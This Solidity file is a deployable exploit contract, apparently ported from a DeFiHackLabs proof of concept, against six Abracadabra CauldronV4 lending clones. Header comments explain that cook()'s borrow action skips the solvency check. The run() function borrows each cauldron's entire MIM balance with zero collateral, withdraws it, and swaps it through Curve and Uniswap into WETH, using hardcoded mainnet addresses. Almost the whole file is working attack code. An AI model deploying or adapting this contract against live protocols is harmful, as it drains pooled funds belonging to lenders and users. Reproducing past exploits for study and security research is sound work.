// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// SYNTHETIC exploit for the EVM Playground — a standalone deployable version of DeFiHackLabs'
// MIMSpell3_exp.sol MIMSpell3Exploit (the Foundry test IS the attacker, address(this) runs the whole
// sequence inline). Ported verbatim as run() = testExploit()'s 5 internal calls.
//
// Bug: six Abracadabra "Privileged" CauldronV4 clones share a master-contract implementation whose
// cook(ACTION_BORROW) path performs NO solvency check — normally ACTION_BORROW sets a flag that makes
// cook() run `require(_isSolvent(msg.sender, ...))` at the end, reverting an undercollateralized borrow,
// but this variant's cook() skips that check entirely. Anyone can borrow each cauldron's ENTIRE MIM
// balance with zero collateral. The PoC's local constant name `ACTION_REPAY = 5` is a misnomer inherited
// from the historical test — action id 5 is really ACTION_BORROW in CauldronV4; the trace emits LogBorrow,
// not LogRepay, and no cauldron debt is ever paid back.
contract MIMSpell3Exploit {
    uint256 private constant BLOCK_NUM_TO_FORK = 23_504_544; // unused here, kept for parity with the original test

    int128 private constant USDT_INDEX = 2;
    uint24 private constant UNISWAP_V3_FEE_TIER = 500;

    uint8 private constant ACTION_BORROW = 5; // misnamed ACTION_REPAY in the historical PoC — see writeup
    uint8 private constant ACTION_NO_OP = 0;

    uint256 private constant INPUT_TOKEN_INDEX = 0;
    uint256 private constant OUTPUT_TOKEN_INDEX = 1;
    uint256 private constant SWAP_TYPE = 1;
    uint256 private constant POOL_TYPE = 1;
    uint256 private constant N_COINS = 2;

    address private constant BENTOBOX = 0xd96f48665a1410C0cd669A88898ecA36B9Fc2cce;
    address private constant CURVE_ROUTER = 0x45312ea0eFf7E09C83CBE249fa1d7598c4C8cd4e;
    address private constant CURVE_3POOL = 0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7;
    address private constant UNISWAP_V3_ROUTER = 0xE592427A0AEce92De3Edee1F18E0157C05861564;

    address private constant MIM = 0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3;
    address private constant THREE_CRV = 0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    address private constant MIM_3CRV_POOL = 0x5a6A4D54456819380173272A5E8E9B9904BdF41B;

    address[6] private CAULDRONS = [
        0x46f54d434063e5F1a2b2CC6d9AAa657b1B9ff82c,
        0x289424aDD4A1A503870EB475FD8bF1D586b134ED,
        0xce450a23378859fB5157F4C4cCCAf48faA30865B,
        0x40d95C4b34127CF43438a963e7C066156C5b87a3,
        0x6bcd99D6009ac1666b58CB68fB4A50385945CDA2,
        0xC6D3b82f9774Db8F92095b5e4352a8bB8B0dC20d
    ];

    function run() external {
        _borrowFromAllCauldrons();
        _withdrawAllMIMFromBentoBox();
        _swapMIMTo3Crv();
        _remove3PoolLiquidityToUSDT();
        _swapUSDTToWETH();
    }

    function _borrowFromAllCauldrons() internal {
        uint8[] memory actions = new uint8[](2);
        actions[0] = ACTION_BORROW;
        actions[1] = ACTION_NO_OP;

        uint256[] memory values = new uint256[](2);

        for (uint256 i = 0; i < CAULDRONS.length; i++) {
            uint256 balavail = IBentoBox(BENTOBOX).balanceOf(MIM, CAULDRONS[i]);
            (uint256 borrowlimit,) = ICauldron(CAULDRONS[i]).borrowLimit();
            if (borrowlimit >= balavail) {
                _borrowFromCauldron(CAULDRONS[i], actions, values, IBentoBox(BENTOBOX).toAmount(MIM, balavail, false));
            }
        }
    }

    function _borrowFromCauldron(
        address cauldron,
        uint8[] memory actions,
        uint256[] memory values,
        uint256 debtAmount
    ) internal {
        bytes[] memory datas = new bytes[](2);
        datas[0] = abi.encode(debtAmount, address(this));
        datas[1] = hex"";
        ICauldron(cauldron).cook(actions, values, datas);
    }

    function _withdrawAllMIMFromBentoBox() internal {
        uint256 mimBalance = IBentoBox(BENTOBOX).balanceOf(MIM, address(this));
        IBentoBox(BENTOBOX).withdraw(MIM, address(this), address(this), 0, mimBalance);
    }

    function _swapMIMTo3Crv() internal {
        uint256 mimAmount = IERC20(MIM).balanceOf(address(this));
        IERC20(MIM).approve(CURVE_ROUTER, mimAmount);

        address[11] memory route;
        route[0] = MIM;
        route[1] = MIM_3CRV_POOL;
        route[2] = THREE_CRV;

        uint256[5][5] memory swapParams;
        swapParams[0][0] = INPUT_TOKEN_INDEX;
        swapParams[0][1] = OUTPUT_TOKEN_INDEX;
        swapParams[0][2] = SWAP_TYPE;
        swapParams[0][3] = POOL_TYPE;
        swapParams[0][4] = N_COINS;

        address[5] memory pools;
        pools[0] = MIM_3CRV_POOL;

        ICurveRouter(CURVE_ROUTER).exchange(route, swapParams, mimAmount, 0, pools, address(this));
    }

    function _remove3PoolLiquidityToUSDT() internal {
        uint256 threeCrvBalance = IERC20(THREE_CRV).balanceOf(address(this));
        IERC20(THREE_CRV).approve(CURVE_3POOL, threeCrvBalance);
        ICurve3Pool(CURVE_3POOL).remove_liquidity_one_coin(threeCrvBalance, USDT_INDEX, 0);
    }

    function _swapUSDTToWETH() internal {
        uint256 usdtBalance = IERC20(USDT).balanceOf(address(this));
        if (usdtBalance > 0) {
            // USDT's real approve() does not return a bool (non-standard ERC20) — a typed IERC20.approve()
            // call here would revert on the empty return data. Use a raw call instead.
            (bool approveOk,) = USDT.call(abi.encodeWithSelector(IERC20.approve.selector, UNISWAP_V3_ROUTER, usdtBalance));
            require(approveOk, "USDT approve failed");

            IUniswapV3Router.ExactInputParams memory params = IUniswapV3Router.ExactInputParams({
                path: abi.encodePacked(USDT, UNISWAP_V3_FEE_TIER, WETH),
                recipient: address(this),
                deadline: block.timestamp,
                amountIn: usdtBalance,
                amountOutMinimum: 0
            });

            IUniswapV3Router(UNISWAP_V3_ROUTER).exactInput(params);
        }
    }

    receive() external payable {}
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface IBentoBox {
    function balanceOf(address token, address user) external view returns (uint256);
    function toAmount(address token, uint256 share, bool roundUp) external view returns (uint256);
    function withdraw(address token, address from, address to, uint256 amount, uint256 share) external returns (uint256 amountOut, uint256 shareOut);
}

interface ICauldron {
    function cook(uint8[] calldata actions, uint256[] calldata values, bytes[] calldata datas) external payable returns (uint256 value1, uint256 value2);
    function borrowLimit() external view returns (uint128 total, uint128 borrowPartPerAddress);
}

interface ICurveRouter {
    function exchange(address[11] calldata route, uint256[5][5] calldata swap_params, uint256 amount, uint256 expected, address[5] calldata pools, address receiver) external returns (uint256);
}

interface ICurve3Pool {
    function remove_liquidity_one_coin(uint256 token_amount, int128 i, uint256 min_amount) external;
}

interface IUniswapV3Router {
    struct ExactInputParams {
        bytes path;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
    }

    function exactInput(ExactInputParams calldata params) external payable returns (uint256 amountOut);
}
